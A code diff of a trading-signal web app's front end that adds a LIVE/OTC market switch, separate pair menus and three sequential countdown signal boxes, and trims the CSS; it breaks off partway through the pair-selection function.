@@ -66,45 +66,27 @@
             padding: 28px 20px;
         }
 
-        /* ── LOCK LOGO WITH NEON GLOW ── */
         .lock-logo-ring {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
+            width: 100px; height: 100px; border-radius: 50%;
             border: 2px solid var(--red);
             background: url('https://i.ibb.co/4gp21J3c/file-000000002a4c71fa923fb7cf1b45336a.png') no-repeat center center;
-            background-size: cover;
-            margin-bottom: 24px;
+            background-size: cover; margin-bottom: 24px;
             box-shadow: 0 0 50px rgba(255, 61, 90, 0.25);
-            animation: lockGlow 2s infinite;
-            transition: all 0.4s ease;
+            animation: lockGlow 2s infinite; transition: all 0.4s ease;
         }
 
         @keyframes lockGlow {
-            0%, 100% { 
-                box-shadow: 0 0 30px rgba(255, 61, 90, 0.3); 
-            }
-            50% { 
-                box-shadow: 0 0 60px rgba(255, 61, 90, 0.6); 
-                border-color: #ff0026; 
-            }
+            0%, 100% { box-shadow: 0 0 30px rgba(255, 61, 90, 0.3); }
+            50% { box-shadow: 0 0 60px rgba(255, 61, 90, 0.6); border-color: #ff0026; }
         }
 
         .lock-title { font-family:'Orbitron',sans-serif; font-size:18px; letter-spacing:2px; color:var(--red); margin-bottom:4px; }
         .lock-sub { font-size:13px; color:var(--muted); margin-bottom:20px; }
 
-        /* ── ID BOX ── */
         .id-box {
-            width: 100%; 
-            max-width: 340px;
-            background: rgba(255, 61, 90, 0.05);
-            border: 1.5px solid var(--red);
-            border-radius: 16px; 
-            padding: 18px 20px;
-            text-align: center; 
-            margin-bottom: 16px;
-            position: relative;
-            box-sizing: border-box;
+            width: 100%; max-width: 340px; background: rgba(255, 61, 90, 0.05);
+            border: 1.5px solid var(--red); border-radius: 16px; padding: 18px 20px;
+            text-align: center; margin-bottom: 16px; position: relative; box-sizing: border-box;
         }
         
         .id-box-label { font-size:10px; color:var(--muted); letter-spacing:2px; margin-bottom:10px; text-transform:uppercase; }
@@ -118,30 +100,35 @@
             background: linear-gradient(135deg,var(--red2),var(--red));
             border:none; border-radius:10px; cursor:pointer;
             font-family:'Orbitron',sans-serif; font-size:12px; font-weight:700;
-            color:#070b14; letter-spacing:2px; transition: transform 0.1s;
+            color:#070b14; letter-spacing:2px; transition: all 0.2s ease;
         }
-        .copy-btn:active { transform:scale(0.97); }
+        .copy-btn:active:not(:disabled) { transform:scale(0.97); }
+
+        /* DISABLED BUTTON STYLING */
+        .copy-btn:disabled {
+            background: #1e293b !important;
+            color: #64748b !important;
+            border: 1px solid #334155 !important;
+            box-shadow: none !important;
+            cursor: not-allowed !important;
+            opacity: 0.7;
+        }
+
         .copy-ok { font-size:11px; color:var(--up); margin-top:8px; min-height:16px; text-align:center; transition:opacity 0.3s; }
 
-        /* Pending status */
         .pending-box {
-            width:100%; max-width:340px;
-            background: rgba(255,61,90,0.04);
-            border:1px solid rgba(255,61,90,0.12);
-            border-radius:14px; padding:16px 18px;
-            text-align:center;
+            width:100%; max-width:340px; background: rgba(255,61,90,0.04);
+            border:1px solid rgba(255,61,90,0.12); border-radius:14px; padding:16px 18px; text-align:center;
         }
         .pending-spinner {
             display:inline-block; width:18px; height:18px;
-            border:2px solid rgba(255,61,90,0.2);
-            border-top-color:var(--red);
+            border:2px solid rgba(255,61,90,0.2); border-top-color:var(--red);
             border-radius:50%; animation:spin 0.9s linear infinite;
             vertical-align:middle; margin-right:8px;
         }
         @keyframes spin{to{transform:rotate(360deg)}}
         .pending-text { font-size:12px; color:var(--muted); display:inline; vertical-align:middle; }
 
-        /* Unlock animation */
         @keyframes unlockPop {
             0%{transform:scale(0.8);opacity:0} 60%{transform:scale(1.08)} 100%{transform:scale(1);opacity:1}
         }
@@ -164,8 +151,7 @@
         .header-logo {
             width:44px; height:44px; border-radius:50%;
             background: url('https://i.ibb.co/4gp21J3c/file-000000002a4c71fa923fb7cf1b45336a.png') no-repeat center center;
-            background-size: cover;
-            flex-shrink:0; box-shadow:0 0 18px rgba(255,61,90,0.35);
+            background-size: cover; flex-shrink:0; box-shadow:0 0 18px rgba(255,61,90,0.35);
         }
         .header-info { flex:1; }
         .header-title { font-family:'Orbitron',sans-serif; font-size:14px; font-weight:900; color:var(--red); letter-spacing:1.5px; }
@@ -174,7 +160,21 @@
         .live-dot { width:7px; height:7px; border-radius:50%; background:var(--up); animation:blink 1s infinite; }
         @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
 
-        .controls { padding:16px 16px 8px; display:flex; flex-direction:column; gap:10px; }
+        .controls { padding:20px 16px 8px; display:flex; flex-direction:column; gap:12px; }
+        
+        .market-switch-row { display: flex; gap: 10px; margin-bottom: 2px; }
+        .market-btn {
+            flex: 1; padding: 12px;
+            background: var(--card); border: 1.5px solid var(--border);
+            border-radius: 12px; color: var(--muted);
+            font-family: 'Orbitron', sans-serif; font-size: 11px; font-weight: 700;
+            letter-spacing: 1px; text-align: center; cursor: pointer; transition: all 0.25s ease;
+        }
+        .market-btn.active {
+            background: rgba(255, 61, 90, 0.15); border-color: var(--red);
+            color: #fff; box-shadow: 0 0 15px rgba(255, 61, 90, 0.2);
+        }
+
         .select-row { display:flex; gap:10px; }
         .custom-select { position:relative; flex:1; }
         .select-btn {
@@ -193,8 +193,7 @@
             display:none; position:absolute; width:100%;
             background:#161f30; border:1.5px solid var(--red);
             border-radius:12px; z-index:200; top:calc(100% + 5px);
-            max-height:220px; overflow-y:auto;
-            box-shadow:0 16px 40px rgba(0,0,0,0.7);
+            max-height:220px; overflow-y:auto; box-shadow:0 16px 40px rgba(0,0,0,0.7);
         }
         .select-drop.show { display:block; }
         .select-drop::-webkit-scrollbar { width:4px; }
@@ -206,75 +205,94 @@
         .drop-item:last-child { border-bottom:none; }
         .drop-item:hover,.drop-item.active { background:rgba(255,61,90,0.12); color:var(--red); }
 
-        .signal-wrap { padding:14px 16px; }
-        .signal-card {
-            background:var(--card); border:1.5px solid var(--border);
-            border-radius:20px; overflow:hidden; position:relative;
+        .timer-select-row { margin-top: 4px; }
+
+        /* ── 3 SIGNAL BOXES CONTAINER ── */
+        .signals-container {
+            padding: 10px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
         }
+
+        .signal-card {
+            background: var(--card);
+            border: 1.5px solid var(--border);
+            border-radius: 20px;
+            overflow: hidden;
+            position: relative;
+            transition: border-color 0.4s ease, box-shadow 0.4s ease, opacity 0.4s ease;
+            opacity: 0.5;
+        }
+
+        .signal-card.active-box {
+            opacity: 1;
+            border-color: var(--red);
+            box-shadow: 0 0 20px rgba(255, 61, 90, 0.25);
+        }
+
+        .signal-card.completed-box {
+            opacity: 0.8;
+            border-color: var(--up);
+        }
+
         .signal-card::before {
             content:''; position:absolute; top:0; left:0; right:0; height:3px;
             background:linear-gradient(90deg,var(--red2),var(--red),transparent);
         }
-        .signal-top { padding:18px 18px 14px; display:flex; align-items:center; gap:14px; }
+
+        .signal-card.completed-box::before {
+            background: linear-gradient(90deg, #00b248, var(--up));
+        }
+
+        .signal-top { padding:16px 16px 12px; display:flex; align-items:center; gap:12px; }
+        
         .signal-icon {
-            width:54px; height:54px; border-radius:14px;
+            width:48px; height:48px; border-radius:12px;
             display:flex; align-items:center; justify-content:center;
-            font-size:26px; flex-shrink:0;
-            background:rgba(255,61,90,0.08); border:1px solid var(--border);
+            font-size:24px; flex-shrink:0; background:rgba(255,61,90,0.08); border:1px solid var(--border);
         }
         .signal-icon.up-icon { background:rgba(0,230,118,0.1); border-color:rgba(0,230,118,0.2); }
         .signal-icon.down-icon { background:rgba(255,61,90,0.1); border-color:rgba(255,61,90,0.2); }
+        
         .signal-info { flex:1; min-width:0; }
-        .signal-pair { font-family:'Orbitron',sans-serif; font-size:14px; font-weight:700; color:var(--text);
+        .signal-pair { font-family:'Orbitron',sans-serif; font-size:13px; font-weight:700; color:var(--text);
             white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-        .signal-meta { font-size:12px; color:var(--muted); margin-top:3px; }
+        .signal-meta { font-size:11px; color:var(--muted); margin-top:2px; }
+        
+        .signal-seq-badge { 
+            display: inline-block; background: rgba(255,61,90,0.2); border: 1px solid var(--red);
+            color: #fff; font-family: 'Orbitron', sans-serif; font-size: 9px; padding: 2px 6px;
+            border-radius: 6px; margin-bottom: 4px; letter-spacing: 1px;
+        }
+
         .signal-dir {
-            font-family:'Orbitron',sans-serif; font-size:20px; font-weight:900;
-            padding:10px 16px; border-radius:10px; flex-shrink:0;
+            font-family:'Orbitron',sans-serif; font-size:16px; font-weight:900;
+            padding:8px 12px; border-radius:8px; flex-shrink:0;
         }
         .signal-dir.UP { color:var(--up); background:rgba(0,230,118,0.12); border:1.5px solid rgba(0,230,118,0.25); }
         .signal-dir.DOWN { color:var(--down); background:rgba(255,61,90,0.12); border:1.5px solid rgba(255,61,90,0.25); }
-        .signal-dir.WAIT { color:var(--red); background:rgba(255,61,90,0.08); border:1.5px solid var(--border); font-size:13px; }
+        .signal-dir.WAIT { color:var(--muted); background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); font-size:11px; }
 
-        .countdown-wrap { padding:0 18px 18px; }
-        .countdown-label { font-size:11px; color:var(--muted); margin-bottom:6px; letter-spacing:1px; }
-        .countdown-bar-bg { height:6px; background:rgba(255,255,255,0.06); border-radius:99px; overflow:hidden; margin-bottom:10px; }
-        .countdown-bar { height:100%; border-radius:99px; background:linear-gradient(90deg,var(--red2),var(--red)); transition:width 1s linear; }
+        .countdown-wrap { padding:0 16px 14px; }
+        .countdown-label { font-size:10px; color:var(--muted); margin-bottom:4px; letter-spacing:1px; display:flex; justify-content:space-between; }
+        .status-tag { font-weight:700; color:var(--muted); }
+        
+        .countdown-bar-bg { height:5px; background:rgba(255,255,255,0.06); border-radius:99px; overflow:hidden; margin-bottom:8px; }
+        .countdown-bar { 
+            height:100%; border-radius:99px; 
+            background:linear-gradient(90deg,var(--red2),var(--red)); 
+            width: 0%;
+            transition: width 0.1s linear;
+            will-change: width;
+        }
         .countdown-bar.up { background:linear-gradient(90deg,#00b248,var(--up)); }
         .countdown-bar.down { background:linear-gradient(90deg,#b20026,var(--down)); }
-        .countdown-num { font-family:'Orbitron',sans-serif; font-size:32px; font-weight:900; text-align:center; letter-spacing:2px; }
-        .countdown-num.up { color:var(--up); text-shadow:0 0 20px rgba(0,230,118,0.4); }
-        .countdown-num.down { color:var(--down); text-shadow:0 0 20px rgba(255,61,90,0.4); }
-        .countdown-num.neutral { color:var(--red); }
-
-        .stats-row { display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; padding:0 16px 14px; }
-        .stat-box { background:var(--card); border:1px solid var(--border); border-radius:12px; padding:12px 10px; text-align:center; }
-        .stat-val { font-family:'Orbitron',sans-serif; font-size:15px; font-weight:700; color:var(--red); }
-        .stat-lbl { font-size:10px; color:var(--muted); margin-top:3px; letter-spacing:0.5px; }
-
-        .section-title {
-            padding:6px 16px 10px; font-family:'Orbitron',sans-serif; font-size:11px;
-            color:var(--red); letter-spacing:2px; display:flex; align-items:center; gap:8px;
-        }
-        .section-title::after { content:''; flex:1; height:1px; background:var(--border); }
-
-        .history-list { padding:0 16px; display:flex; flex-direction:column; gap:8px; }
-        .hist-item {
-            background:var(--card); border:1px solid var(--border); border-radius:12px;
-            padding:12px 14px; display:flex; align-items:center; gap:12px;
-            animation:slideIn 0.3s ease;
-        }
-        @keyframes slideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
-        .hist-dir { font-family:'Orbitron',sans-serif; font-size:11px; font-weight:700; padding:5px 10px; border-radius:7px; flex-shrink:0; }
-        .hist-dir.UP { color:var(--up); background:rgba(0,230,118,0.1); }
-        .hist-dir.DOWN { color:var(--down); background:rgba(255,61,90,0.1); }
-        .hist-info { flex:1; min-width:0; }
-        .hist-pair { font-size:13px; font-weight:600; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-        .hist-time { font-size:11px; color:var(--muted); margin-top:2px; }
-        .hist-dur { font-size:11px; color:var(--red); font-weight:600; flex-shrink:0; }
-
-        .empty-state { text-align:center; padding:40px 20px; color:var(--muted); font-size:14px; }
-        .empty-state .icon { font-size:42px; margin-bottom:12px; opacity:0.5; }
+        
+        .countdown-num { font-family:'Orbitron',sans-serif; font-size:24px; font-weight:900; text-align:center; letter-spacing:2px; }
+        .countdown-num.up { color:var(--up); text-shadow:0 0 15px rgba(0,230,118,0.4); }
+        .countdown-num.down { color:var(--down); text-shadow:0 0 15px rgba(255,61,90,0.4); }
+        .countdown-num.neutral { color:var(--muted); }
 
         #toast {
             position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(20px);
@@ -288,61 +306,17 @@
         }
         #toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
         
-        /* ── TELEGRAM CONTACTS UI ── */
-        .contact-wrap {
-            width: 100%;
-            max-width: 340px;
-            margin-top: 16px;
-            text-align: center;
-        }
-        .contact-label {
-            font-size: 10px;
-            color: var(--muted);
-            letter-spacing: 2px;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-            text-align: left;
-            padding-left: 4px;
-        }
+        .contact-wrap { width: 100%; max-width: 340px; margin-top: 16px; text-align: center; }
+        .contact-label { font-size: 10px; color: var(--muted); letter-spacing: 2px; margin-bottom: 6px; text-transform: uppercase; text-align: left; padding-left: 4px; }
         .contact-link {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            padding: 12px;
-            border-radius: 12px;
-            text-decoration: none;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 12px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            transition: all 0.2s ease;
-            box-sizing: border-box;
+            display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px;
+            border-radius: 12px; text-decoration: none; font-family: 'Orbitron', sans-serif;
+            font-size: 12px; font-weight: 700; letter-spacing: 1px; transition: all 0.2s ease; box-sizing: border-box;
         }
-        .tg-admin {
-            background: rgba(255, 61, 90, 0.08);
-            border: 1.5px solid var(--border);
-            color: var(--text);
-        }
-        .tg-admin:hover, .tg-admin:active {
-            background: rgba(255, 61, 90, 0.15);
-            border-color: var(--red);
-            box-shadow: 0 0 15px rgba(255, 61, 90, 0.2);
-            transform: scale(0.98);
-        }
-        .tg-channel {
-            background: linear-gradient(135deg, #1d2733, #243447);
-            border: 1.5px solid #229ED9;
-            color: #229ED9;
-            text-shadow: 0 0 10px rgba(34, 158, 217, 0.3);
-        }
-        .tg-channel:hover, .tg-channel:active {
-            background: #229ED9;
-            color: #070b14;
-            text-shadow: none;
-            box-shadow: 0 0 20px rgba(34, 158, 217, 0.4);
-            transform: scale(0.98);
-        }
+        .tg-admin { background: rgba(255, 61, 90, 0.08); border: 1.5px solid var(--border); color: var(--text); }
+        .tg-admin:hover, .tg-admin:active { background: rgba(255, 61, 90, 0.15); border-color: var(--red); box-shadow: 0 0 15px rgba(255, 61, 90, 0.2); transform: scale(0.98); }
+        .tg-channel { background: linear-gradient(135deg, #1d2733, #243447); border: 1.5px solid #229ED9; color: #229ED9; text-shadow: 0 0 10px rgba(34, 158, 217, 0.3); }
+        .tg-channel:hover, .tg-channel:active { background: #229ED9; color: #070b14; text-shadow: none; box-shadow: 0 0 20px rgba(34, 158, 217, 0.4); transform: scale(0.98); }
         
         .popup-overlay {
             position:fixed; inset:0; z-index:5000;
@@ -354,16 +328,12 @@
         .popup {
             background:var(--card); border:1.5px solid var(--red); border-radius:22px;
             padding:28px 24px; width:100%; max-width:340px; text-align:center;
-            transform:scale(0.92); transition:transform 0.25s;
-            box-shadow:0 30px 80px rgba(0,0,0,0.7);
+            transform:scale(0.92); transition:transform 0.25s; box-shadow:0 30px 80px rgba(0,0,0,0.7);
         }
         .popup-overlay.show .popup { transform:scale(1); }
-        .popup-icon { font-size:50px; margin-bottom:14px; }
         .popup-title { font-family:'Orbitron',sans-serif; font-size:16px; font-weight:700; color:var(--red); margin-bottom:8px; }
         .popup-body { font-size:14px; color:var(--text); line-height:1.7; margin-bottom:22px; }
         .popup-pair { font-family:'Orbitron',sans-serif; font-size:22px; font-weight:900; margin:10px 0; }
-        .popup-pair.UP { color:var(--up); }
-        .popup-pair.DOWN { color:var(--down); }
         .popup-btn {
             padding:14px 32px; border:none; border-radius:12px;
             background:linear-gradient(135deg,var(--red2),var(--red));
@@ -424,65 +394,109 @@
         </div>
 
         <div class="controls">
+            <div class="market-switch-row">
+                <div class="market-btn active" id="btnLiveMarket" onclick="switchMarket('LIVE')">LIVE MARKET</div>
+                <div class="market-btn" id="btnOtcMarket" onclick="switchMarket('OTC')">OTC MARKET</div>
+            </div>
+
             <div class="select-row">
-                <div class="custom-select" id="pairSelect">
-                    <div class="select-btn" id="pairBtn" onclick="toggleDrop('pair')">
-                        <span class="label" id="pairLabel">Select Pair ▼</span>
+                <div class="custom-select" id="livePairSelect">
+                    <div class="select-btn" id="livePairBtn" onclick="toggleDrop('livePair')">
+                        <span class="label" id="livePairLabel">Select LIVE Pair ▼</span>
                         <span class="arr">▼</span>
                     </div>
-                    <div class="select-drop" id="pairDrop"></div>
+                    <div class="select-drop" id="livePairDrop"></div>
                 </div>
-                <div class="custom-select" id="timeSelect">
-                    <div class="select-btn" id="timeBtn" onclick="toggleDrop('time')">
-                        <span class="label" id="timeLabel">Select Time ▼</span>
+
+                <div class="custom-select" id="otcPairSelect" style="display:none;">
+                    <div class="select-btn" id="otcPairBtn" onclick="toggleDrop('otcPair')">
+                        <span class="label" id="otcPairLabel">Select OTC Pair ▼</span>
                         <span class="arr">▼</span>
                     </div>
-                    <div class="select-drop" id="timeDrop"></div>
+                    <div class="select-drop" id="otcPairDrop"></div>
                 </div>
             </div>
-            <button class="copy-btn" style="margin-top: 8px; font-size: 14px; padding: 14px; box-shadow: 0 0 15px rgba(255,61,90,0.3);" onclick="requestSignal()">⚡ GET SIGNAL</button>
+
+            <div class="custom-select timer-select-row" id="timeSelect">
+                <div class="select-btn" id="timeBtn" onclick="toggleDrop('time')">
+                    <span class="label" id="timeLabel">Select Timer ▼</span>
+                    <span class="arr">▼</span>
+                </div>
+                <div class="select-drop" id="timeDrop"></div>
+            </div>
+
+            <button class="copy-btn" id="btnGetSignal" style="margin-top: 10px; font-size: 14px; padding: 14px; box-shadow: 0 0 15px rgba(255,61,90,0.3);" onclick="requestSignal()">⚡ GET SIGNAL</button>
         </div>
 
-        <div class="signal-wrap">
-            <div class="signal-card">
+        <!-- 3 SIGNAL BOXES -->
+        <div class="signals-container">
+            <!-- BOX 1 -->
+            <div class="signal-card" id="card-1">
                 <div class="signal-top">
-                    <div class="signal-icon" id="sigIcon">📊</div>
+                    <div class="signal-icon" id="sigIcon-1">📊</div>
                     <div class="signal-info">
-                        <div class="signal-pair" id="sigPair">Select pair & time</div>
-                        <div class="signal-meta" id="sigMeta">Waiting for signal...</div>
+                        <div class="signal-seq-badge">BOX 1 • SIGNAL 1 OF 3</div>
+                        <div class="signal-pair" id="sigPair-1">Select pair & time</div>
+                        <div class="signal-meta" id="sigMeta-1">Waiting for signal...</div>
                     </div>
-                    <div class="signal-dir WAIT" id="sigDir">—</div>
+                    <div class="signal-dir WAIT" id="sigDir-1">—</div>
                 </div>
                 <div class="countdown-wrap">
-                    <div class="countdown-label">SIGNAL COUNTDOWN</div>
-                    <div class="countdown-bar-bg">
-                        <div class="countdown-bar" id="cntBar"></div>
+                    <div class="countdown-label">
+                        <span>SIGNAL COUNTDOWN</span>
+                        <span class="status-tag" id="statusTag-1">PENDING</span>
                     </div>
-                    <div class="countdown-num neutral" id="cntNum">--:--</div>
+                    <div class="countdown-bar-bg">
+                        <div class="countdown-bar" id="cntBar-1"></div>
+                    </div>
+                    <div class="countdown-num neutral" id="cntNum-1">--:--</div>
                 </div>
             </div>
-        </div>
 
-        <div class="stats-row">
-            <div class="stat-box">
-                <div class="stat-val" id="statTotal">0</div>
-                <div class="stat-lbl">TOTAL</div>
+            <!-- BOX 2 -->
+            <div class="signal-card" id="card-2">
+                <div class="signal-top">
+                    <div class="signal-icon" id="sigIcon-2">📊</div>
+                    <div class="signal-info">
+                        <div class="signal-seq-badge">BOX 2 • SIGNAL 2 OF 3</div>
+                        <div class="signal-pair" id="sigPair-2">Select pair & time</div>
+                        <div class="signal-meta" id="sigMeta-2">Waiting for signal...</div>
+                    </div>
+                    <div class="signal-dir WAIT" id="sigDir-2">—</div>
+                </div>
+                <div class="countdown-wrap">
+                    <div class="countdown-label">
+                        <span>SIGNAL COUNTDOWN</span>
+                        <span class="status-tag" id="statusTag-2">PENDING</span>
+                    </div>
+                    <div class="countdown-bar-bg">
+                        <div class="countdown-bar" id="cntBar-2"></div>
+                    </div>
+                    <div class="countdown-num neutral" id="cntNum-2">--:--</div>
+                </div>
             </div>
-            <div class="stat-box">
-                <div class="stat-val" style="color:#00e676;" id="statUp">0</div>
-                <div class="stat-lbl">CALL ↑</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-val" style="color:#ff3d5a;" id="statDown">0</div>
-                <div class="stat-lbl">PUT ↓</div>
-            </div>
-        </div>
 
-        <div class="section-title">SIGNAL HISTORY</div>
-        <div class="history-list" id="historyList">
-            <div class="empty-state">
-                <div class="icon">📡</div>
-                No signals yet. Select a pair & time.
+            <!-- BOX 3 -->
+            <div class="signal-card" id="card-3">
+                <div class="signal-top">
+                    <div class="signal-icon" id="sigIcon-3">📊</div>
+                    <div class="signal-info">
+                        <div class="signal-seq-badge">BOX 3 • SIGNAL 3 OF 3</div>
+                        <div class="signal-pair" id="sigPair-3">Select pair & time</div>
+                        <div class="signal-meta" id="sigMeta-3">Waiting for signal...</div>
+                    </div>
+                    <div class="signal-dir WAIT" id="sigDir-3">—</div>
+                </div>
+                <div class="countdown-wrap">
+                    <div class="countdown-label">
+                        <span>SIGNAL COUNTDOWN</span>
+                        <span class="status-tag" id="statusTag-3">PENDING</span>
+                    </div>
+                    <div class="countdown-bar-bg">
+                        <div class="countdown-bar" id="cntBar-3"></div>
+                    </div>
+                    <div class="countdown-num neutral" id="cntNum-3">--:--</div>
+                </div>
             </div>
         </div>
     </div>
@@ -497,12 +511,13 @@
                 <div class="popup-pair" id="popupPrepSeconds" style="color: var(--text); font-size: 26px; margin: 15px 0;">5s</div>
             </div>
             <div id="popupSignalState" style="display: none;">
-                <div class="popup-icon" id="popIcon">📈</div>
-                <div class="popup-title">NEW SIGNAL</div>
-                <div class="popup-pair" id="popDir">UP</div>
-                <div class="popup-body" style="font-weight:600;" id="popPairName">---</div>
-                <div class="popup-body" id="popDur" style="color:var(--muted); font-size:12px; margin-top:-10px;">Duration: --</div>
-                <button class="popup-btn" onclick="closePopupAndStartTrade()">GOT IT ✓</button>
+                <div class="popup-title">3 SIGNAL TIMELINE READY</div>
+                <div class="popup-pair" id="popPairName">---</div>
+                <div class="popup-body">
+                    3 Sequential Signals Generated!<br>
+                    Click <b>GOT IT</b> to start smooth timeline execution.
+                </div>
+                <button class="popup-btn" onclick="startSequenceExecution()">GOT IT ✓</button>
             </div>
         </div>
     </div>
@@ -510,18 +525,27 @@
     <script>
         const USERS_URL = "https://admin-panel-6c101-default-rtdb.firebaseio.com/users.json"; 
 
-        const PAIRS = [ 
-            "USD/PKR(OTC)","USD/ARS(OTC)","USD/CAD(OTC)","USD/DZD(OTC)","USD/NZD(OTC)", 
-            "NZD/CAD(OTC)","USD/BDT(OTC)","USD/MXN(OTC)","USD/TRY(OTC)","NZD/JPY(OTC)", 
-            "Solana(OTC)","Celestia(OTC)","TRON(OTC)","Trump(OTC)","Gold(OTC)","Silver(OTC)", 
-            "UScrude(OTC)","UKBrent(OTC)","Johnson & Johnson(OTC)","Intel(OTC)", 
-            "FACEBOOK INC(OTC)","Pfizer Inc(OTC)","Microsoft(OTC)","American Express(OTC)", 
-            "Boeing Company(OTC)","McDonald's(OTC)","Pepe(OTC)" 
+        const OTC_PAIRS = [ 
+            "USD/PKR(OTC)", "USD/ARS(OTC)", "USD/CAD(OTC)", "USD/BRL(OTC)", "USD/DZD(OTC)", "USD/NZD(OTC)",
+            "NZD/CAD(OTC)", "USD/BDT(OTC)", "USD/MXN(OTC)", "USD/TRY(OTC)", "NZD/JPY(OTC)",
+            "Solana(OTC)", "Celestia(OTC)", "TRON(OTC)", "Trump(OTC)", "Gold(OTC)", "Silver(OTC)",
+            "UScrude(OTC)", "UKBrent(OTC)", "Johnson & Johnson(OTC)", "Intel(OTC)",
+            "FACEBOOK INC(OTC)", "Pfizer Inc(OTC)", "Microsoft(OTC)", "American Express(OTC)",
+            "Boeing Company(OTC)", "McDonald's(OTC)", "Pepe(OTC)"
         ]; 
+
+        const LIVE_PAIRS = [
+            "EUR/USD", "EUR/JPY", "EUR/GBP", "EUR/CHF", "USD/JPY",
+            "USD/CHF", "USD/CAD", "GBP/USD", "GBP/JPY", "GBP/CHF",
+            "AUD/USD", "AUD/JPY"
+        ];
+
         const TIMES = [ 
             {l:"5 Sec",v:5},{l:"10 Sec",v:10},{l:"15 Sec",v:15},{l:"30 Sec",v:30}, 
             {l:"1 Min",v:60},{l:"2 Min",v:120},{l:"5 Min",v:300},{l:"10 Min",v:600} 
         ]; 
+
+        let activeMarket = 'LIVE'; 
 
         function getDeviceID() { 
             let id = localStorage.getItem('rqa_device_id'); 
@@ -635,15 +659,26 @@
         } 
 
         function buildDrops() { 
-            const pd = document.getElementById('pairDrop'); 
-            pd.innerHTML = "";
-            PAIRS.forEach(p => { 
+            const lpd = document.getElementById('livePairDrop'); 
+            lpd.innerHTML = "";
+            LIVE_PAIRS.forEach(p => { 
                 const d = document.createElement('div'); 
                 d.className = 'drop-item'; 
                 d.textContent = p; 
-                d.onclick = () => selectPair(p); 
-                pd.appendChild(d); 
+                d.onclick = () => selectPair(p, 'LIVE'); 
+                lpd.appendChild(d); 
             }); 
+
+            const opd = document.getElementById('otcPairDrop'); 
+            opd.innerHTML = "";
+            OTC_PAIRS.forEach(p => { 
+                const d = document.createElement('div'); 
+                d.className = 'drop-item'; 
+                d.textContent = p; 
+                d.onclick = () => selectPair(p, 'OTC'); 
+                opd.appendChild(d); 
+            }); 
+
             const td = document.getElementById('timeDrop'); 
             td.innerHTML = "";
             TIMES.forEach(t => { 
@@ -655,28 +690,52 @@
             }); 
         } 
 
+        function switchMarket(type) {
+            activeMarket = type;
+            document.getElementById('btnLiveMarket').classList.toggle('active', type === 'LIVE');
+            document.getElementById('btnOtcMarket').classList.toggle('active', type === 'OTC');
+
+            document.getElementById('livePairSelect').style.display = type === 'LIVE' ? 'block' : 'none';
+            document.getElementById('otcPairSelect').style.display = type === 'OTC' ? 'block' : 'none';
+            
+            selPair = null;
+            document.getElementById('livePairLabel').textContent = 'Select LIVE Pair ▼';
+            document.getElementById('otcPairLabel').textContent = 'Select OTC Pair ▼';
+            resetAllBoxes();
+        }
+
         function toggleDrop(type) { 
-            const pd = document.getElementById('pairDrop'), pb = document.getElementById('pairBtn'); 
+            const lpd = document.getElementById('livePairDrop'), lpb = document.getElementById('livePairBtn'); 
+            const opd = document.getElementById('otcPairDrop'), opb = document.getElementById('otcPairBtn'); 
             const td = document.getElementById('timeDrop'), tb = document.getElementById('timeBtn'); 
-            if (type === 'pair') { 
-                const o = pd.classList.contains('show'); 
-                pd.classList.toggle('show', !o); 
-                pb.classList.toggle('open', !o); 
-                td.classList.remove('show'); 
-                tb.classList.remove('open'); 
+
+            if (type === 'livePair') { 
+                const o = lpd.classList.contains('show'); 
+                lpd.classList.toggle('show', !o); 
+                lpb.classList.toggle('open', !o); 
+                td.classList.remove('show'); tb.classList.remove('open'); 
+            } else if (type === 'otcPair') { 
+                const o = opd.classList.contains('show'); 
+                opd.classList.toggle('show', !o); 
+                opb.classList.toggle('open', !o); 
+                td.classList.remove('show'); tb.classList.remove('open'); 
             } else { 
                 const o = td.classList.contains('show'); 
                 td.classList.toggle('show', !o); 
                 tb.classList.toggle('open', !o); 
-                pd.classList.remove('show'); 
-                pb.classList.remove('open'); 
+                lpd.classList.remove('show'); lpb.classList.remove('open'); 
+                opd.classList.remove('show'); opb.classList.remove('open'); 
             } 
         } 
 
         document.addEventListener('click', e => { 
-            if (!e.target.closest('#pairSelect')) { 
-                const pd = document.getElementById('pairDrop'), pb = document.getElementById('pairBtn');
-                if(pd && pb){ pd.classList.remove('show'); pb.classList.remove('open'); }
+            if (!e.target.closest('#livePairSelect')) { 
+                const lpd = document.getElementById('livePairDrop'), lpb = document.getElementById('livePairBtn');
+                if(lpd && lpb){ lpd.classList.remove('show'); lpb.classList.remove('open'); }
+            } 
+            if (!e.target.closest('#otcPairSelect')) { 
+                const opd = document.getElementById('otcPairDrop'), opb = document.getElementById('otcPairBtn');
+                if(opd && opb){ opd.classList.remove('show'); opb.classList.remove('open'); }
             } 
             if (!e.target.closest('#timeSelect')) { 
                 const td = document.getElementById('timeDrop'), tb = document.getElementById('timeBtn');
@@ -685,14 +744,21 @@
         }); 
 
         let selPair = null, selTime = null; 
-        function selectPair(p) { 
+        function selectPair(p, type) { 
             selPair = p; 
-            document.getElementById('pairLabel').textContent = p; 
-            document.getElementById('pairDrop').classList.remove('show'); 
-            document.getElementById('pairBtn').classList.remove('open'); 
-            document.querySelectorAll('#pairDrop .drop-item').forEach(d => d.classList.toggle('active', d.textContent === p)); 
+            if(type === 'LIVE'){
+                document.getElementById('livePairLabel').textContent = p; 
+                document.getElementById('livePairDrop').classList.remove('show'); 
+                document.getElementById('livePairBtn').classList.remove('open'); 
+                document.querySelectorAll('#livePairDrop .drop-item').forEach(d => d.classList.toggle('active', d.textContent === p)); 
+            } else {
+                document.getElementById('otcPairLabel').textContent = p; 
+                document.getElementById('otcPairDrop').classList.remove('show'); 
+                document.getElementById('otcPairBtn').classList.remove('open'); 
